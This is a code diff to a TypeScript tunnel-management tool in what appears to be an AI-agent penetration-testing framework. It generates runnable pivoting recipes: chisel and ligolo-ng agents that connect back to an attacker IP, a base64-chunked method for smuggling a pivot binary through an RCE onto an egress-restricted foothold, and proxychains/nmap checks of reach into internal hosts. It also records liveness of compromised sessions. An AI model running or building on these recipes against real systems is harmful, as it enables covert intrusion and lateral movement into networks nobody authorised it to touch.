@@ -5,11 +5,25 @@ import DESCRIPTION from "./tunnel-manage.txt"
 import * as Tool from "./tool"
 
 export const Parameters = Schema.Struct({
-  action: Schema.Literals(["plan", "register", "list", "remove"]).annotate({
-    description: "plan: generate tunnel commands. register: record established tunnel. list: show active tunnels. remove: mark session dead.",
+  action: Schema.Literals(["plan", "register", "list", "remove", "healthcheck"]).annotate({
+    description:
+      "plan: generate a COMPLETE runnable tunnel recipe (attacker-IP filled, binary staging + verify). register: record an established tunnel. list: show active tunnels. remove: mark session dead. healthcheck: record a liveness probe result (last_seen/alive).",
   }),
   host_ip: Schema.optional(Schema.String).annotate({
-    description: "Target host IP (required for plan/register)",
+    description: "Target host IP (required for plan/register) — the FOOTHOLD the tunnel runs through",
+  }),
+  attacker_ip: Schema.optional(Schema.String).annotate({
+    description:
+      "Your (attacker) IP the target connects back to for reverse tunnels (chisel/ligolo). If omitted, falls back to $OPENCODE_ATTACKER_IP; else a <ATTACKER_IP> placeholder + a warning.",
+  }),
+  binary: Schema.optional(Schema.String).annotate({
+    description: "Pivot binary to stage onto the foothold for chisel/ligolo (default: chisel).",
+  }),
+  pid: Schema.optional(Schema.Number).annotate({
+    description: "PID of the established tunnel/shell (for register/healthcheck liveness).",
+  }),
+  alive: Schema.optional(Schema.Boolean).annotate({
+    description: "healthcheck: set the session alive (true) or dead (false) after probing it.",
   }),
   tunnel_type: Schema.optional(
     Schema.Literals(["ssh_local", "ssh_dynamic", "socks", "port_forward", "chisel", "ligolo"]),
@@ -90,11 +104,43 @@ function findCredsForHost(
   return undefined
 }
 
+// Staged base64-chunked binary transfer — for LANDING a pivot binary (chisel /
+// ligolo-agent) on an egress-restricted, curl-less foothold whose RCE truncates
+// output (the field-run killer). Chunk on the attacker box, append chunk-by-chunk
+// through the RCE, reassemble + chmod on the target. This is the make-or-break step:
+// a chisel/ligolo plan is useless if the binary can't reliably land.
+function stagedTransferRecipe(binaryName: string, hostIp: string): string[] {
+  return [
+    `# --- Stage the ${binaryName} binary onto the foothold ${hostIp} (no curl/egress; RCE truncates output) ---`,
+    `# On YOUR box: fetch the right STATIC linux binary once (match the target arch), then base64-chunk it:`,
+    `#   # e.g. chisel:  curl -fsSL https://github.com/jpillora/chisel/releases/latest/download/chisel_<ver>_linux_amd64.gz | gunzip > ${binaryName}`,
+    `#   split -b 2000 <(base64 -w0 ${binaryName}) /tmp/${binaryName}_chunk_   # 2KB single-line-safe chunks`,
+    `# Push each chunk through the RCE (append on the target); order matters:`,
+    `#   for f in /tmp/${binaryName}_chunk_*; do <RCE> "echo -n $(cat "$f") >> /tmp/${binaryName}.b64"; done`,
+    `# Reassemble + run on the target:`,
+    `#   <RCE> "base64 -d /tmp/${binaryName}.b64 > /tmp/${binaryName} && chmod +x /tmp/${binaryName} && /tmp/${binaryName} --version"`,
+    `#   node-only foothold: <RCE> 'node -e "process.stdout.write(Buffer.from(require(\\"fs\\").readFileSync(\\"/tmp/${binaryName}.b64\\",\\"utf8\\"),\\"base64\\"))" > /tmp/${binaryName} && chmod +x /tmp/${binaryName}'`,
+  ]
+}
+
+function socksVerifyRecipe(localPort: number, target?: string): string[] {
+  const t = target ?? "<internal-host>"
+  return [
+    `# --- VERIFY the tunnel is live BEFORE routing work through it ---`,
+    `# proxychains.conf (last line): socks5 127.0.0.1 ${localPort}`,
+    `printf 'strict_chain\\n[ProxyList]\\nsocks5 127.0.0.1 ${localPort}\\n' > /tmp/pc.conf`,
+    `proxychains4 -q -f /tmp/pc.conf nmap -sT -Pn -n -p 22,80,445 ${t}   # a hit through the proxy = tunnel UP`,
+    `# Then register: tunnel_manage action:register (record pid + local_port) so the fleet routes via state_query sessions.`,
+  ]
+}
+
 function buildTunnelCommand(
   type: string,
   hostIp: string,
   creds: { user: string; value: string; isKey: boolean } | undefined,
   localPort: number,
+  attackerIp: string,
+  binaryName: string,
   remoteTarget?: string,
   remotePort?: number,
 ): string[] {
@@ -117,35 +163,34 @@ function buildTunnelCommand(
     case "socks": {
       lines.push(`# SSH dynamic SOCKS proxy on localhost:${localPort} via ${hostIp}`)
       lines.push(`${sshpassPrefix}ssh ${authFlag} -D ${localPort} ${user}@${hostIp} -N -f`.replace(/\s+/g, " ").trim())
-      lines.push(`# Use: proxychains -q <command>  (ensure /etc/proxychains.conf has socks5 127.0.0.1 ${localPort})`)
+      lines.push(...socksVerifyRecipe(localPort, remoteTarget))
       break
     }
     case "chisel": {
-      const rt = remoteTarget ?? "127.0.0.1"
-      const rp = remotePort ?? 80
-      lines.push(`# Chisel tunnel: localhost:${localPort} -> ${rt}:${rp} via ${hostIp}`)
-      lines.push(`# 1. Start chisel server on your machine:`)
-      lines.push(`chisel server --reverse --port 8000`)
-      lines.push(`# 2. On target (${hostIp}), run chisel client:`)
-      lines.push(`chisel client YOUR_IP:8000 R:${localPort}:${rt}:${rp}`)
-      lines.push(`# 3. Access via: curl http://127.0.0.1:${localPort}/`)
+      lines.push(`# Chisel reverse SOCKS: foothold ${hostIp} -> attacker ${attackerIp} -> SOCKS5 on 127.0.0.1:${localPort}`)
+      lines.push(`# 1. On YOUR box (${attackerIp}): start the reverse server`)
+      lines.push(`chisel server --reverse --port 8000 --socks5`)
+      lines.push(...stagedTransferRecipe(binaryName, hostIp))
+      lines.push(`# 2. On the foothold ${hostIp}: connect back and expose a reverse SOCKS on your box:${localPort}`)
+      lines.push(`/tmp/${binaryName} client ${attackerIp}:8000 R:${localPort}:socks &`)
+      lines.push(...socksVerifyRecipe(localPort, remoteTarget))
       break
     }
     case "ligolo": {
-      lines.push(`# Ligolo-ng tunnel via ${hostIp}`)
-      lines.push(`# 1. Start ligolo proxy on your machine:`)
-      lines.push(`sudo ip tuntap add user $(whoami) mode tun ligolo`)
-      lines.push(`sudo ip link set ligolo up`)
+      lines.push(`# Ligolo-ng tunnel: foothold ${hostIp} -> attacker ${attackerIp}`)
+      lines.push(`# 1. On YOUR box (${attackerIp}): tun iface + proxy`)
+      lines.push(`sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up`)
       lines.push(`ligolo-proxy -selfcert -laddr 0.0.0.0:11601`)
-      lines.push(`# 2. On target (${hostIp}), run ligolo agent:`)
-      lines.push(`./ligolo-agent -connect YOUR_IP:11601 -ignore-cert`)
-      lines.push(`# 3. In ligolo proxy console:`)
-      lines.push(`# session  (select the session)`)
+      lines.push(...stagedTransferRecipe(binaryName, hostIp))
+      lines.push(`# 2. On the foothold ${hostIp}: connect the agent back`)
+      lines.push(`/tmp/${binaryName} -connect ${attackerIp}:11601 -ignore-cert &`)
+      lines.push(`# 3. In the ligolo proxy console: session -> (select) -> start`)
       if (remoteTarget) {
         const subnet = remoteTarget.includes("/") ? remoteTarget : `${remoteTarget}/24`
-        lines.push(`# sudo ip route add ${subnet} dev ligolo`)
+        lines.push(`# then route the internal subnet through the agent:`)
+        lines.push(`sudo ip route add ${subnet} dev ligolo`)
       }
-      lines.push(`# start`)
+      lines.push(`# Verify: proxychains not needed (route-based) — nmap -sT -Pn <internal-host> should now reach it.`)
       break
     }
     default:
@@ -194,17 +239,27 @@ export const TunnelManageTool = Tool.define(
               const tunnelType = params.tunnel_type ?? "ssh_dynamic"
               const localPort = params.local_port ?? DEFAULT_LOCAL_PORT
               const creds = findCredsForHost(state, params.host_ip, params.credential_id, params.username)
+              const attackerIp = params.attacker_ip ?? process.env.OPENCODE_ATTACKER_IP ?? ""
+              const binaryName = params.binary ?? "chisel"
+              const needsAttacker = tunnelType === "chisel" || tunnelType === "ligolo"
 
               const lines: string[] = []
               lines.push(`Tunnel plan for ${params.host_ip} (${tunnelType}):`)
               lines.push("")
 
               if (!creds) {
-                lines.push("WARNING: No credentials found for this host. Commands will use placeholder USER.")
+                lines.push("WARNING: No credentials found for this host. SSH commands will use placeholder USER.")
                 lines.push("Use cred_spray suggest to find valid credentials first.")
                 lines.push("")
               } else {
                 lines.push(`Credentials: ${creds.user} (${creds.credType})`)
+                lines.push("")
+              }
+
+              if (needsAttacker && !attackerIp) {
+                lines.push(
+                  "WARNING: attacker_ip unknown — pass attacker_ip or set $OPENCODE_ATTACKER_IP. Using <ATTACKER_IP> placeholder; fill it before running the reverse tunnel.",
+                )
                 lines.push("")
               }
 
@@ -213,6 +268,8 @@ export const TunnelManageTool = Tool.define(
                 params.host_ip,
                 creds,
                 localPort,
+                attackerIp || "<ATTACKER_IP>",
+                binaryName,
                 params.remote_target,
                 params.remote_port,
               )
@@ -237,13 +294,16 @@ export const TunnelManageTool = Tool.define(
               const sessionId = params.session_id ?? `tunnel-${Date.now()}`
               const localPort = params.local_port ?? DEFAULT_LOCAL_PORT
 
+              const nowIso = new Date().toISOString()
               yield* store.addLiveSession({
                 id: sessionId,
                 session_type: sessionType,
                 host_ip: params.host_ip,
                 port: localPort,
                 username: params.username,
-                established_at: new Date().toISOString(),
+                pid: params.pid,
+                established_at: nowIso,
+                last_seen: nowIso,
                 alive: true,
                 local_port: localPort,
                 remote_target: params.remote_target,
@@ -296,6 +356,35 @@ export const TunnelManageTool = Tool.define(
                 title: `Removed: ${params.session_id}`,
                 metadata: { session_id: params.session_id },
                 output: `Session "${params.session_id}" removed.`,
+              }
+            }
+
+            case "healthcheck": {
+              if (!params.session_id) {
+                return { title: "Error", metadata: {}, output: "Error: session_id is required for healthcheck action." }
+              }
+              const sess = (state.live_sessions ?? []).find((s) => s.id === params.session_id)
+              if (!sess) {
+                return { title: "Error", metadata: {}, output: `Session "${params.session_id}" not found.` }
+              }
+              yield* store.updateLiveSession(params.session_id, {
+                last_seen: new Date().toISOString(),
+                ...(params.alive !== undefined ? { alive: params.alive } : {}),
+                ...(params.pid !== undefined ? { pid: params.pid } : {}),
+              })
+              const updated = yield* store.get()
+              if (updated) yield* store.save(updated)
+              const lp = sess.local_port ?? sess.port ?? DEFAULT_LOCAL_PORT
+              const lines = [
+                `Session "${params.session_id}" last_seen updated${params.alive !== undefined ? `, alive=${params.alive}` : ""}.`,
+                "",
+                "Re-verify it is still up before routing more work through it:",
+                ...socksVerifyRecipe(lp, sess.remote_target),
+              ]
+              return {
+                title: `Healthcheck: ${params.session_id}`,
+                metadata: { session_id: params.session_id, alive: params.alive },
+                output: lines.join("\n"),
               }
             }
 
